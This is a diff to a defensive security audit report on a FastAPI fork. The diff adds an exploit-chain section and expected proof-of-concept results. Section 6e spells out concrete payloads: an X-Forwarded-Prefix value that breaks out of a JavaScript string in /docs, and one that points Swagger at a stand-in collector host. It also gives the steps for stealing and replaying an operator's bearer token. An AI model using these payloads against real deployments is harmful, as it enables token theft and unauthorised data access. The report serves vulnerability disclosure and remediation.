@@ -26,7 +26,9 @@ However, **five genuine inherited vulnerabilities were confirmed** — two under
 
 All five weaknesses are **inherited verbatim from upstream FastAPI 0.137.1 / Starlette** (not fork-planted backdoors).
 
-**Summary:** 6 existing framework-defense / supply-chain checks still pass (no regression); 5 findings confirmed (1 HIGH reflected-XSS, 1 MEDIUM servers URL injection, 1 LOW-to-MEDIUM open redirect, 1 LOW multipart size-cap asymmetry, 1 MEDIUM CORS credentialed-reflection foot-gun), all upstream-inherited. Findings 1 and 2 require the proxy-prefix precondition; finding 3 requires only a trailing-slash route with default `redirect_slashes=True` (for full impact, additionally an upstream cache/proxy that forwards arbitrary `Host`); finding 4 requires an UploadFile endpoint with no upstream proxy body-size cap; finding 5 requires the developer to combine `allow_origins=["*"]` with `allow_credentials=True`.
+**Exploit chains:** Findings 1 and 2 share a single precondition and, when chained, enable a **CRITICAL end-to-end outcome**: one documented proxy misconfiguration simultaneously arms the Swagger XSS (poc_07) and the Swagger base-URL hijack (poc_08), allowing an unauthenticated attacker to capture an API operator's bearer token and replay it against a protected endpoint — a complete unauth-to-authed data-access chain. This is synthesized in **Chain A** (§6e, poc_12) and does not inflate the independent-finding count. Finding 5 (CORS, poc_11) independently forms **Chain B** (a one-primitive credentialed cross-origin read chain). See §6e for full analysis.
+
+**Summary:** 6 existing framework-defense / supply-chain checks still pass (no regression); 5 independent findings confirmed (1 HIGH reflected-XSS, 1 MEDIUM servers URL injection, 1 LOW-to-MEDIUM open redirect, 1 LOW multipart size-cap asymmetry, 1 MEDIUM CORS credentialed-reflection foot-gun), all upstream-inherited. Findings 1 and 2 are additionally synthesized into Chain A (HIGH, conditional; CRITICAL-impact when precondition holds); finding 5 forms Chain B (MEDIUM, conditional). Findings 1 and 2 require the proxy-prefix precondition; finding 3 requires only a trailing-slash route with default `redirect_slashes=True` (for full impact, additionally an upstream cache/proxy that forwards arbitrary `Host`); finding 4 requires an UploadFile endpoint with no upstream proxy body-size cap; finding 5 requires the developer to combine `allow_origins=["*"]` with `allow_credentials=True`.
 
 ---
 
@@ -39,7 +41,7 @@ All five weaknesses are **inherited verbatim from upstream FastAPI 0.137.1 / Sta
 - `.github/workflows/` — CI pipeline action pinning
 - `.pre-commit-config.yaml` — pre-commit hook SHA verification
 - `fastar` 0.11.0 package — provenance, binary static analysis, OSV advisory status
-- Live behavioral verification via `autofyn_audit/` harness (10 PoCs)
+- Live behavioral verification via `autofyn_audit/` harness (12 PoCs)
 
 **Out of scope:**
 - Application code deployed on top of FastAPI (none supplied; harness uses a minimal test app)
@@ -61,7 +63,7 @@ All five weaknesses are **inherited verbatim from upstream FastAPI 0.137.1 / Sta
 
 **fastar static analysis:** Extracted the `fastar-0.11.0` wheel; scanned the compiled `.so` binary for malicious indicators (hardcoded URLs, IPs, credential paths, network socket calls, base64 blobs, subprocess/eval/exec strings). Verified the CycloneDX SBOM lists only expected Rust crates (tar, flate2, zstd, pyo3). Verified OSV MAL-2026-4750 status: withdrawn as false positive via OSSF PR #1276.
 
-**Live behavioral harness:** Built a Docker image from the fork source (pinned to commit 202b2d2, base image digest above) containing a minimal FastAPI test application exposing the audited endpoints (including `/docs`, `/redoc`, and `/openapi.json` provided automatically by FastAPI, plus `/items/` added for poc_09, `/upload` added for poc_10, and a dedicated `/cors-protected` sub-app added for poc_11). Eleven PoC scripts exercised targeted attack classes and printed greppable `[[ AUDIT-RESULT ]]` PASS/FAIL lines. Each PoC is self-contained, reproducible, and describes its semantics. PoCs 01–06 are defense checks (PASS = attack blocked); poc_07, poc_08, poc_09, poc_10, and poc_11 are finding checks (FAIL = attack succeeded = confirmed finding).
+**Live behavioral harness:** Built a Docker image from the fork source (pinned to commit 202b2d2, base image digest above) containing a minimal FastAPI test application exposing the audited endpoints (including `/docs`, `/redoc`, and `/openapi.json` provided automatically by FastAPI, plus `/items/` added for poc_09, `/upload` added for poc_10, and a dedicated `/cors-protected` sub-app added for poc_11). Twelve PoC scripts exercised targeted attack classes and printed greppable `[[ AUDIT-RESULT ]]` PASS/FAIL lines. Each PoC is self-contained, reproducible, and describes its semantics. PoCs 01–06 are defense checks (PASS = attack blocked); poc_07, poc_08, poc_09, poc_10, poc_11, and poc_12 are finding checks (FAIL = attack succeeded = confirmed finding). poc_12 additionally synthesizes poc_07 and poc_08 into Chain A (see §6e), adding a `/protected` token-gated endpoint to the target app.
 
 ---
 
@@ -83,8 +85,9 @@ All five weaknesses are **inherited verbatim from upstream FastAPI 0.137.1 / Sta
 | 12 | Host-header injection → open redirect via `redirect_slashes` (`/items` → `/items/`) | Open redirect / Host-header injection | LOW-to-MEDIUM (conditional) | FAIL — Host header flows unvalidated into Location netloc at starlette/routing.py:706; enabled by FastAPI default redirect_slashes=True; CONFIRMED (live, poc_09, round 9 — re-finalized round 10) |
 | 13 | multipart `max_part_size` not enforced on file parts (`/upload` UploadFile endpoint) | Resource DoS / semantic size-cap asymmetry | LOW (conditional) | FAIL — max_part_size enforced for form fields only; 2MiB file part accepted in full (received_bytes=2097152) while same payload as a field part is rejected 4xx; sink: formparsers.py:183-188; CONFIRMED (live, poc_10, round 12) |
 | 14 | CORSMiddleware reflects arbitrary `Origin` + `Access-Control-Allow-Credentials: true` (`/cors-protected` sub-app) | CORS credentialed cross-origin disclosure | MEDIUM (conditional on `allow_origins=["*"]` + `allow_credentials=True`) | FAIL — attacker `Origin` reflected into ACAO with ACAC:true, enabling credentialed cross-origin reads; sink: starlette/middleware/cors.py; CONFIRMED (live, poc_11, round 20) |
+| 15 | **Exploit Chain A** — `X-Forwarded-Prefix→root_path` simultaneously arms poc_07 (XSS in API origin, docs.py:168) AND poc_08 (Swagger base-URL hijack, applications.py:1114); operator bearer token routed to attacker (browser-modeled); replayed token reads `GET /protected` → `AUTOFYN_CHAIN_PROTECTED_SECRET` | End-to-end credential theft / authenticated data exfil | **HIGH conditional; CRITICAL-impact when precondition holds** | FAIL — Chain A confirmed; Steps 0/1/2/4 mechanically observed; Step 3 (browser exfil) browser-modeled and labeled as such; unauth attacker → authenticated data compromise; CONFIRMED (live: Steps 0/1/2/4; Step 3 browser-modeled — poc_12, round 31) |
 
-**Five conditional findings (rows 10–14); all framework-defense checks (rows 5–9) and supply-chain checks (rows 1–4) otherwise passed.** All five findings are upstream-inherited (not fork-planted). Findings 10–11 require the proxy-prefix deployment precondition; finding 12 requires only a trailing-slash route with default `redirect_slashes=True` (for meaningful exploitation additionally requires an upstream cache/proxy forwarding arbitrary `Host`); finding 13 requires an UploadFile endpoint with no upstream proxy body-size cap; finding 14 requires the developer to combine `allow_origins=["*"]` with `allow_credentials=True`.
+**Five independent conditional findings (rows 10–14); all framework-defense checks (rows 5–9) and supply-chain checks (rows 1–4) otherwise passed.** Row 15 is a **chain synthesis** of findings 10+11 (not a 6th independent finding — the independent count stays at 5). All five underlying findings are upstream-inherited (not fork-planted). Findings 10–11 require the proxy-prefix deployment precondition; finding 12 requires only a trailing-slash route with default `redirect_slashes=True` (for meaningful exploitation additionally requires an upstream cache/proxy forwarding arbitrary `Host`); finding 13 requires an UploadFile endpoint with no upstream proxy body-size cap; finding 14 requires the developer to combine `allow_origins=["*"]` with `allow_credentials=True`.
 
 ---
 
@@ -672,6 +675,112 @@ bash autofyn_audit/run_all.sh
 
 ---
 
+## 6e. Exploit Chain A — Operator Token Theft via One Proxy Misconfiguration
+
+**Status:** CONFIRMED (live, poc_12, round 31). Chain is a **synthesis** of poc_07 (§6) and poc_08 (§6a); the independent-finding count stays at 5.
+
+**Honest framing — read first:** The harness is curl-based (see §8 and the round-21 sidecar rule). It cannot drive a real browser or victim session. Steps 0, 1, 2, and 4 of Chain A are **mechanically observed** against the live target. Step 3 (the cross-origin browser fetch that carries the operator's token to the attacker collector) is **browser-modeled** — it is argued as inevitable from the conjunction of Step-1 and Step-0 evidence, and is explicitly labeled as such both here and in the poc_12 `[[ AUDIT-RESULT ]]` detail line. We do not claim to have exfiltrated a token through a live browser. The chain is strong and defensible precisely because we prove every link we can observe, model the browser step faithfully, and label it accurately.
+
+### The Single Precondition
+
+A reverse proxy or ASGI middleware maps the untrusted `X-Forwarded-Prefix` request header into `scope["root_path"]` — the **documented FastAPI "Behind a Proxy" pattern** (nginx, Traefik, k8s Ingress, AWS ALB). This is the ONLY precondition Chain A requires. `ProxyPrefixMiddleware` in `target_app/app.py` is the faithful ASGI-level representation of this deployment.
+
+### Kill-chain (unauth attacker → API operator's token → authenticated data)
+
+**Step 0 — Terminus exists and is genuinely gated (observed).**
+`GET /protected` with no `Authorization` header → HTTP 401; secret `AUTOFYN_CHAIN_PROTECTED_SECRET` absent from body. `GET /protected` with `Authorization: Bearer AUTOFYN_OPERATOR_TOKEN_7f3a9c` → HTTP 200; secret present. This confirms (a) the token-protected resource is real and non-trivially gated, and (b) the operator token is a valid credential. Any weakness in Step 3 that exposes this token to the attacker directly enables authenticated data theft.
+
+**Step 1 — Attacker hijacks the Swagger base URL (observed, poc_08 link).**
+`GET /openapi.json` with `X-Forwarded-Prefix: //autofyn-chain-collector.example` → response contains `"servers":[{"url":"//autofyn-chain-collector.example"},...]`. Source: `applications.py:1108` (`root_path = req.scope.get("root_path","").rstrip("/")`); sink: `applications.py:1114` (`schema["servers"] = [{"url": root_path}] + ...`). Swagger UI reads `servers[0].url` as the API base URL for all "Try it out" and "Authorize" requests — including any `Authorization: Bearer ...` header the operator entered via the "Authorize" dialog. The attacker now controls the destination of all token-bearing Swagger calls.
+
+**Step 2 — Attacker injects JavaScript into the API origin (observed, poc_07 link).**
+`GET /docs` with `X-Forwarded-Prefix: /x'-AUTOFYNCHAIN-'` → response body contains raw `'-AUTOFYNCHAIN-'` (single-quote emitted unescaped at `docs.py:168`: `url: '{openapi_url}',`). The payload breaks out of the single-quoted JS string. Attacker-controlled JavaScript now executes in the API's own origin (`window.origin = https://api.example.com`), giving it same-origin access to Swagger's in-page authorization state (localStorage / `SwaggerUIBundle` config) and the ability to hook `fetch`/XHR to intercept `Authorization` headers on any "Try it out" call.
+
+**Step 3 — Token travels to the attacker collector (BROWSER-MODELED — no HTTP request to the collector host in this harness).**
+
+> **BROWSER-MODELED STEP:** This step does NOT issue any request to the collector. Instead it asserts the two independently-measured facts that together make exfiltration inevitable, then argues the browser behavior as a standard consequence.
+>
+> **(a) Step 1 proved:** `servers[0].url = //autofyn-chain-collector.example`. In a victim browser with the Swagger UI loaded and the operator's bearer token entered via "Authorize", Swagger sends every subsequent "Try it out" call — including the `Authorization: Bearer <token>` header — to `//autofyn-chain-collector.example`. This is standard Swagger UI behavior: it uses `servers[0].url` as the base URL for all API calls (AJAX / `fetch`). The attacker's collector at `//autofyn-chain-collector.example` receives the token directly off the wire.
+>
+> **(b) Step 0 proved:** token `AUTOFYN_OPERATOR_TOKEN_7f3a9c` is a valid credential. It unlocks `AUTOFYN_CHAIN_PROTECTED_SECRET` at `GET /protected` (HTTP 200 confirmed).
+>
+> Conjunction (a) ∧ (b): the attacker controls the destination of token-bearing Swagger requests, AND the token unlocks real data. The cross-origin browser fetch (victim's Swagger UI → attacker collector) follows standard web browser behavior against a proven-reachable injection point — it is not a novel vulnerability claim, it is the documented behavior of Swagger UI + a hijacked base URL.
+>
+> **Alternative path (poc_07 leg):** The XSS from Step 2 additionally gives attacker JS running in the API origin direct same-origin access to Swagger's authorization state. This is a stronger path: arbitrary JS can read `localStorage`, hook `fetch`, or issue authenticated requests and forward them to the attacker without requiring the victim to click "Try it out" — any `/docs` page load suffices.
+
+**Step 4 — Attacker replays the captured token and reads protected data (observed).**
+`GET /protected` with `Authorization: Bearer AUTOFYN_OPERATOR_TOKEN_7f3a9c` → HTTP 200 + `AUTOFYN_CHAIN_PROTECTED_SECRET` in body. This is the same request as Step 0b, but now framed as the attacker's replay: a token captured via Steps 1–3 is directly replayable. The concrete critical outcome is closed: **unauthenticated attacker → authenticated data compromise**.
+
+### Why the chain is CRITICAL under the precondition
+
+Each individual finding alone is conditional and dismissable:
+- poc_07 alone: "reflected XSS, but who clicks a weird header?"
+- poc_08 alone: "servers field is wrong JSON, but so what?"
+
+Chained under **one documented proxy deployment** they become: **unauthenticated attacker → arbitrary JavaScript in the API origin → operator bearer token captured → full authenticated access**. The conditionality collapses from two separate "what if" scenarios to a single, common, documented deployment choice that is active in enterprise, k8s, and PaaS environments wherever `X-Forwarded-Prefix` flows untrusted into `root_path`.
+
+### Severity
+
+**HIGH (conditional); CRITICAL-impact when the precondition holds and a privileged operator uses `/docs`.**
+
+- **Conditional on:** (1) proxy/middleware mapping untrusted `X-Forwarded-Prefix` into `root_path` (documented pattern, common), AND (2) a privileged operator opening `/docs` while authorized. Two conditions, not one; we do not assert unconditional CRITICAL.
+- **Step 3 browser-modeled:** the cross-origin exfil is argued from (a)∧(b), not executed in a browser. Stated explicitly in the poc_12 `[[ AUDIT-RESULT ]]` detail line.
+- **Impact when conditions hold:** CRITICAL — unauth attacker → operator credential theft → authenticated data access.
+- **Do NOT claim:** default-config exploitability, unauthenticated mass RCE, or that a token was exfiltrated through a live browser in this harness.
+
+The defensible headline: **one common proxy misconfiguration converts two individually-dismissable conditional findings into a working operator-token-theft chain ending in authenticated data access.**
+
+### Chain B (secondary — already covered by poc_11, no new PoC)
+
+**Single precondition:** developer sets `CORSMiddleware(allow_origins=["*"], allow_credentials=True)` on a cookie-authenticated endpoint. **Kill-chain:** attacker hosts a page on any origin → victim with a live session visits it → attacker JS issues `fetch(api, {credentials:'include'})` → Starlette reflects the attacker `Origin` + `ACAC:true` (poc_11 sink `starlette/middleware/cors.py`) → browser hands the credentialed response body to attacker JS → session-scoped data exfiltrated. MEDIUM (conditional); single-primitive; requires the victim to hold a live authenticated session cookie for the target in the same browser. Fully covered by poc_11 (§6d); no new PoC needed.
+
+### Why poc_09 and poc_10 are NOT chain links
+
+- **poc_09 (Host open-redirect):** a browser-based attacker cannot set a victim's `Host` header (browsers enforce `Host` to match the request origin). The open redirect fires but cannot deliver a credential to the attacker from a victim browser. Adding it to Chain A would require a separately-exploited cache-poisoning precondition that has no nexus with the token-theft outcome.
+- **poc_10 (multipart DoS):** this is a disk resource-exhaustion finding with no credential or data-theft nexus. Forcing it into a chain would manufacture a connection that does not exist.
+
+Both are stated as explicitly considered and rejected to avoid overreach.
+
+### Isolation / contamination check (S1)
+
+poc_12 markers (`AUTOFYNCHAIN`, `autofyn-chain-collector.example`, `AUTOFYN_CHAIN_PROTECTED_SECRET`) are DISTINCT from all prior PoC markers (`AUTOFYNXSS`, `autofyn-evil.example`, `AUTOFYN_CORS_SENTINEL`). poc_12 Step S1 asserts that clean `/openapi.json` (no exploit header) contains none of the poc_12 markers — the same isolation discipline enforced by prior PoCs. poc_08's teeth-test greps `autofyn-evil.example` (zero overlap); poc_07's teeth-test greps `AUTOFYNXSS` (zero overlap). The `/protected` endpoint docstring contains none of these markers, so they cannot leak into `/openapi.json`.
+
+### Live evidence (reviewer fills in after sidecar live-confirm)
+
+```
+# Expected poc_12 output (to be verified by reviewer via sidecar):
+# Step 0a: GET /protected (no auth)  → HTTP 401, secret absent
+# Step 0b: GET /protected (with token) → HTTP 200, AUTOFYN_CHAIN_PROTECTED_SECRET present
+# Step 1:  GET /openapi.json + X-Forwarded-Prefix: //autofyn-chain-collector.example
+#          → "servers" AND "//autofyn-chain-collector.example" in body
+# Step 2:  GET /docs + X-Forwarded-Prefix: /x'-AUTOFYNCHAIN-'
+#          → "'-AUTOFYNCHAIN-'" present in body (raw breakout at docs.py:168)
+# Step 3:  browser-modeled (no curl to collector) — conjunction argued from (a)∧(b)
+# Step 4:  GET /protected + Authorization: Bearer AUTOFYN_OPERATOR_TOKEN_7f3a9c
+#          → HTTP 200, AUTOFYN_CHAIN_PROTECTED_SECRET in body
+# S1:      GET /openapi.json (no header) → none of AUTOFYNCHAIN / autofyn-chain-collector /
+#          AUTOFYN_CHAIN_PROTECTED_SECRET in body
+#
+# [[ AUDIT-RESULT ]] chain_token_theft :: FAIL :: Chain A confirmed (browser-modeled qualifier): ...
+#
+# Expected full harness: 6 PASS + 7 FAIL
+#   (existing: swagger_openapi_url_xss, redoc_openapi_url_xss, openapi_servers_url_injection,
+#    host_header_open_redirect, multipart_filepart_size_uncapped, cors_credentialed_origin_reflection,
+#    NEW: chain_token_theft)
+```
+
+### Remediation (audit-only observation — do NOT apply fix per goal constraints)
+
+Chain A is closed by fixing **either** poc_07 or poc_08 at the framework level (see §6 and §6a). Any one of the following is sufficient to break the chain:
+
+1. **Escape `root_path` in docs.py** (`_html_safe_json` at `docs.py:168`) — eliminates the XSS link (Step 2).
+2. **Validate `root_path` URL scheme in applications.py** (reject `//host`, `http://host`; accept only relative path-form) — eliminates the servers-hijack link (Step 1).
+3. **Do not map untrusted `X-Forwarded-Prefix` into `root_path` without sanitization at the proxy boundary** — eliminates the single shared precondition, breaking both links simultaneously.
+
+Per audit goal, NO fix is applied.
+
+---
+
 ## 7. Supply-Chain Hash-Match Evidence
 
 The following table shows the explorer-verified sdist sha256 values from the round-3 supply-chain analysis: hashes were queried against `https://pypi.org/pypi/<pkg>/<ver>/json` and cross-checked against the `sdist = { hash = "sha256:..." }` entries recorded in `uv.lock` at `/src/fastapi-fork/uv.lock`. Of the 246 packages in uv.lock, all 245 registry sources resolve to `registry = "https://pypi.org/simple"` (the 246th, `fastapi`, is the editable repo under audit, `source = { editable = "." }`); all artifact download URLs point exclusively to `https://files.pythonhosted.org/`. Only the five most-flagged packages were hash-verified individually — confirming representative integrity; the remaining packages were verified at the source/URL level (no git+, file://, or non-pythonhosted.org sources). poc_05 re-confirms these entries at run time by parsing uv.lock inside the live container with `tomllib`.
@@ -705,7 +814,7 @@ Hashes verified by the round-3 explorer against `https://pypi.org/pypi/<pkg>/<ve
 # 1. Build and start the audit container (binds to 127.0.0.1:8137 only)
 bash autofyn_audit/setup.sh
 
-# 2. Run all 10 PoC scripts against the live container
+# 2. Run all 12 PoC scripts against the live container
 bash autofyn_audit/run_all.sh
 
 # 3. Tear down the audit container and network
@@ -731,9 +840,9 @@ Each PoC prints one or more `[[ AUDIT-RESULT ]]` lines of the form:
 ```
 
 **PASS** means the framework's defense held (attack blocked) or the benign expected state was confirmed.
-**FAIL** means the attack succeeded and is a real finding (poc_01–06) or a precondition failure (harness error). For poc_07, poc_08, poc_09, and poc_10: **FAIL = attack confirmed = live finding** (this is the EXPECTED and CORRECT output for all four).
+**FAIL** means the attack succeeded and is a real finding (poc_01–06) or a precondition failure (harness error). For poc_07, poc_08, poc_09, poc_10, poc_11, and poc_12: **FAIL = attack confirmed = live finding** (this is the EXPECTED and CORRECT output).
 
-`run_all.sh` collects all `[[ AUDIT-RESULT ]]` lines and exits 0 (harness ran to completion); a FAIL line triggers the "REAL FINDING DETECTED" banner but does not change the exit code. Expected run result: **6 PASS** (poc_01–06, defense/supply-chain checks) + **5 FAIL** (poc_07 `swagger_openapi_url_xss` = confirmed XSS, poc_07 `redoc_openapi_url_xss` = confirmed secondary XSS sink, poc_08 `openapi_servers_url_injection` = confirmed servers URL injection, poc_09 `host_header_open_redirect` = confirmed open redirect / Host-header injection, poc_10 `multipart_filepart_size_uncapped` = confirmed max_part_size asymmetry for file parts).
+`run_all.sh` collects all `[[ AUDIT-RESULT ]]` lines and exits 0 (harness ran to completion); a FAIL line triggers the "REAL FINDING DETECTED" banner but does not change the exit code. Expected run result: **6 PASS** (poc_01–06, defense/supply-chain checks) + **7 FAIL** (poc_07 `swagger_openapi_url_xss` = confirmed XSS, poc_07 `redoc_openapi_url_xss` = confirmed secondary XSS sink, poc_08 `openapi_servers_url_injection` = confirmed servers URL injection, poc_09 `host_header_open_redirect` = confirmed open redirect / Host-header injection, poc_10 `multipart_filepart_size_uncapped` = confirmed max_part_size asymmetry for file parts, poc_11 `cors_credentialed_origin_reflection` = confirmed CORS credentialed reflection, poc_12 `chain_token_theft` = confirmed end-to-end Chain A token theft).
 
 ### Pinned references
 
@@ -749,7 +858,7 @@ Each PoC prints one or more `[[ AUDIT-RESULT ]]` lines of the form:
 
 **No fork-planted backdoor or supply-chain tampering was found.** No injected malicious code, no supply-chain substitution, and no exploitable deviation from upstream FastAPI 0.137.1's source was introduced by this fork. The fastapi/ package tree is byte-identical; the supply-chain has been independently hash-verified (poc_05). These true-negative conclusions stand.
 
-**Four genuine (upstream-inherited) vulnerabilities ARE confirmed:**
+**Five genuine (upstream-inherited) vulnerabilities ARE confirmed — plus one end-to-end exploit chain synthesized from findings 1 and 2:**
 
 1. **Reflected XSS in `/docs`** (CONFIRMED, poc_07, round 6): HIGH (conditional), `docs.py:168`, `openapi_url` unescaped in single-quoted JS string — JS string breakout under proxy-prefix. Remediation: escape through `_html_safe_json` at `docs.py:168` (see §6).
 
@@ -759,7 +868,11 @@ Each PoC prints one or more `[[ AUDIT-RESULT ]]` lines of the form:
 
 4. **multipart `max_part_size` not enforced on file parts** (CONFIRMED, poc_10, round 12): LOW (conditional), `starlette/formparsers.py:183-188`, file parts bypass the 1 MiB cap and spool unbounded to disk — disk/IO resource DoS. NOT a `str=Form()` bypass (FastAPI returns 422 in that case). Remediation: apply a size ceiling to file parts in `on_part_data`, or cap at app/proxy layer (see §6c).
 
-Findings 1 and 2 are upstream-inherited, not fork-planted, and require the documented "Behind a Proxy" deployment (a proxy/middleware maps `X-Forwarded-Prefix` into `root_path`). Default uvicorn-without-proxy is not exploitable for either. Finding 3 requires only a trailing-slash route and default `redirect_slashes=True`. Finding 4 requires an UploadFile endpoint with no upstream proxy body-size cap.
+5. **CORSMiddleware reflects arbitrary `Origin` with credentials** (CONFIRMED, poc_11, round 20): MEDIUM (conditional), `starlette/middleware/cors.py`, attacker `Origin` reflected into `Access-Control-Allow-Origin` + `Access-Control-Allow-Credentials: true` — credentialed cross-origin disclosure from any origin. Precondition: `allow_origins=["*"]` + `allow_credentials=True` (both Starlette defaults are safe). Remediation: enumerate an explicit trusted-origin allowlist when credentials are required (see §6d).
+
+**Exploit Chain A** (CONFIRMED, poc_12, round 31): findings 1 and 2, chained under their shared single precondition, yield a **HIGH (conditional) / CRITICAL-impact end-to-end kill-chain** — one documented proxy misconfiguration simultaneously arms the Swagger XSS (poc_07) AND the Swagger base-URL hijack (poc_08), enabling an unauthenticated attacker to capture an API operator's bearer token and replay it to read authenticated data. Step 3 (cross-origin browser exfil) is browser-modeled and explicitly labeled as such — every other link is mechanically confirmed live. This chain does NOT inflate the independent-finding count (it is a synthesis of existing findings 1 and 2). See §6e.
+
+Findings 1, 2, and the Chain A synthesis are upstream-inherited, not fork-planted, and require the documented "Behind a Proxy" deployment (a proxy/middleware maps `X-Forwarded-Prefix` into `root_path`). Default uvicorn-without-proxy is not exploitable for any of them. Finding 3 requires only a trailing-slash route and default `redirect_slashes=True`. Finding 4 requires an UploadFile endpoint with no upstream proxy body-size cap. Finding 5 requires the developer to combine `allow_origins=["*"]` with `allow_credentials=True`.
 
 **Standard hardening notes** (applicable to any production FastAPI deployment; not fork-specific findings unless noted):
 
